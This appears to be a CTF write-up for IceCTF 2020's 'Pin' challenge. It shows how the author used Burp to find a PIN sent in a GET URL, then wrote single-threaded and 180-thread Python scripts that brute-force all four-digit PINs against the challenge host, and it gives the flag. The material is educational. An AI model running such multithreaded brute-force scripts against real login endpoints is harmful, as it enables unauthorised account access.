title: IceCTF 2020 - Multithreading Requests 
---

IceCTF took place over the weekend and had a range of fun challenges. This writeup will be focussing on the miscellaneous category and the "Pin" challenge, which involved looking at requests in Burp and multithreading them using Python to bruteforce a four digit passcode on a website in under ten seconds. 

# The Challenge
**Name:** Pin

**Category:** Miscellaneous 


**Points:** 100


**Requirements:** Python, [Burp](https://portswigger.net/burp/communitydownload).


>You are late again, and just can’t remember the PIN code to the [locker](http://www.misc-pin.vuln.icec.tf/) that has the secret Novichok stuff you need for work. What do you do?

# Initial Analysis
The link in the challenge description takes us to a pretty lockscreen which resembles an iPhone. Immediately I tried entering a bunch of random passwords such as 1234, 1337 ect. to see if anything in the URL would change (or maybe even luck out and get it through guessing), but as expected, I didn't learn much. I decided to fire up Burp, a tool which allows one to peek at requests and modify them, which gave me a better understanding of what was going on behind the scenes.

Once Burp was ready to go, I navigated to the 'Proxy' tab and selected 'Open Browser'. This opens up Chromium which Burp can directly interface with. 'Intercept is on' should be selected by default, which will allow us to stop and modify requests before they're sent. 

Now that we've got everything we need, we can paste the link in the browser and see what things look like.

First off, since we're only navigating to the home page there's nothing we didn't already know in this request. What we are intersted in is what happens when we enter in a passcode, so let's do that.

This looks more promising...we can see a GET request to another URL (www.misc-pin.vuln.icec.tf/login/1337) which contains the passcode we just entered. This is great news, as it means we can bruteforce it through spamming requests with all 10,000 possible passcode combinations! It'd also be good to see how the website responds to this passcode (which we know is wrong), so we can make use of Burp's 'Repeater' tool. Simply right click the request and click the 'Send to Repeater' option.

Navigate to the 'Repeater' tab and click 'Send'. This will show us the response from the website to our passcode, which gives us some JSON data.

This is perfect, as it means we can check the resonse from the website to check if the ``correct`` field is set to true or false when we write a script to try all possible passcodes.

# Bruteforcing Requests 
We now know that the passcode is sent to /login/ via a GET request, so all we need to do now is write a script that can try every passcode combination in a relatively short amount of time. This is where the Python [requests](https://pypi.org/project/requests/) module comes in handy. It effectively does the same thing as manually entering in a passcode, just automated.  

```python
import requests
  
for pin in range(9999):
    # allows us to try '0001' instead of just '1' as a passcode
    pin = '{0:04}'.format(pin)
    print('Trying: ' + pin)

    # creates a new URL each time with a new passcode to try
    URL = "http://www.misc-pin.vuln.icec.tf/login/" + str(pin)

    # peforms a get request and stores the response in r
    r = requests.get(url = URL)
    temp = str(r.content)
    print(temp)

    # checks if the 'correct' field is set to true
    if 'true' in temp:
        print('FOUND!' + '\nPASSWORD: ' + pin)
        quit()
```

The above is a relatively quick and easy solution that gets the job done...it's just really slow. I left it running, looked at some other challenges and eventually got a match for ``1729`` after 15 minutes.

Now, it would've been okay to stop here as the challenge was now solved and we had the flag, but I knew that there was a much faster way to do this so I looked into multithreading in Python and came across [ThreadPoolExecutor](https://www.tutorialspoint.com/concurrency_in_python/concurrency_in_python_pool_of_threads.htm). Rewriting the script took a little time, but I came up with the following: 

```python
from concurrent.futures.thread import ThreadPoolExecutor
from requests import Session, Response
from requests.adapters import HTTPAdapter
from functools import partial
from multiprocessing import Pool
import tqdm
import os

def execute(urls, method, size):
    i = 0
    # creates a new session 
    session = Session()
    session.mount('http://', HTTPAdapter(pool_maxsize = size))

    # creates a worker that calls make_request
    worker = partial(method, session)

    # executes make_request asynchronously with 180 workers
    with ThreadPoolExecutor(size) as pool:

        # creates a pretty progres bar and allows us to check responses 
        for req in tqdm.tqdm(pool.map(worker, urls), total = len(urls)):
            temp = str(req.content)
            if "true" in temp:
                print("\n\nFOUND! Password is: " + str(i))
                print(str(req.content) + "\n")
                quit()
            i+=1
    session.close()

# method we want to multithread
def make_request(session, url):
    return session.get(url)

# generates a list of all 10000 URLs
urls = [("http://www.misc-pin.vuln.icec.tf/login/" + "{0:04}".format(num)) for num in range(9999)]

# kick starts the program with 180 workers
execute(urls, make_request, 180)
```

This cracked the passcode in under 10 seconds (compared to 10 minutes before) and effectively works by doing the previous solution, but 180x faster. The optimised script gets through 1729 requests before the previous one can even reach 15. The reason I selected ``180`` for the amount of workers is because I found it was a sweet spot in terms of speed for my computer as it started to slow down with anything higher - although I'm sure this will greatly vary depending on a device's CPU. Here's a comparison between the two:

Bit of a shorter write up, but I thought I'd share my quick solution that I'll definitely be reusing in the future for similar challenges! The flag was ``IceCTF{t1mIng_r3al1y_is_everyth1ng_isNt_it}``, which I thought was quite fitting. 

# What did I learn?
1) Multithreading is amazing for bruteforcing. 


2) Shorter solutions != good.
